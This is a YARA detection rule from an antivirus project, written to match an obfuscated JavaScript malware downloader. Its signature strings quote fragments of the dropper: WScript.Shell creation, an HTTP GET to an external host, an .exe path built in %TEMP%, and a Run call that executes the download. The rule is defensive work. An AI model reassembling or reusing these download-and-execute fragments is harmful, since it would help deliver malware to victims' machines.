rule sig_20160328_6ae8aa6cbd8f36b1e2fbda9d6224b483 {
  meta:
    description = "datamaliciousorder - file 20160328_6ae8aa6cbd8f36b1e2fbda9d6224b483.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d2de86e0e8dc99c7936a3ae5b568161063495c6b3715e9eea01053e2ca237442"

  strings:
    $s1  = "function Qeiqw() {return Jlsad[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hUN2OFgcaBAs1H.exe\";};" fullword ascii
    $s2  = "Xisvduxotz[Zmzesgc](\"GET\", \"http://extragames.besaba.com/b3ysfa\", false);" fullword ascii
    $s3  = "do {WScript[Wreqa](Pmnplxohiu() * 11)} while (Xisvduxotz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Jlsad = function Frtyaqohyx() {return WScript[Ntdrcigdw](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rcxpqb(Vycrmsplqn, Lgcfgjj){return Vycrmsplqn - Lgcfgjj;};" fullword ascii
    $s6  = "return Rcxpqb(Qdbogeyes, Vraossqcdc);" fullword ascii
    $s7  = "function Onzyn(Cvquvenrc){Jlsad[\"Run\"](Cvquvenrc, Gnvkhh, Gnvkhh);};" fullword ascii
    $s8  = "function Kglwandiry() {return ((Tanxncqznc == true) && (Tanxncqznc == Rtxnxyu)) ? 1 : Gnvkhh;};" fullword ascii
    $s9  = " while (Ofaiommz){" fullword ascii
    $s10 = "function Eozzxmg(){return Gfxqm;};" fullword ascii
    $s11 = "var Tanxncqznc = false;" fullword ascii
    $s12 = "function Plshwhmvk(Ldsczta) {var Pvtiueiqe = (1, 2, 3, 4, 5, Ldsczta); return Pvtiueiqe;};" fullword ascii
    $s13 = "var Rtxnxyu = false;" fullword ascii
    $s14 = "var Nouhoy = false;" fullword ascii
    $s15 = "Tanxncqznc = true; " fullword ascii
    $s16 = "Rtxnxyu = true; " fullword ascii
    $s17 = "function Bngjasj()" fullword ascii
    $s18 = "function Rdjkbmksxc(){return Ntdrcigdw;};" fullword ascii
    $s19 = "function Pmnplxohiu(){return 22;};" fullword ascii
    $s20 = "var Kwuuljtgzz = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}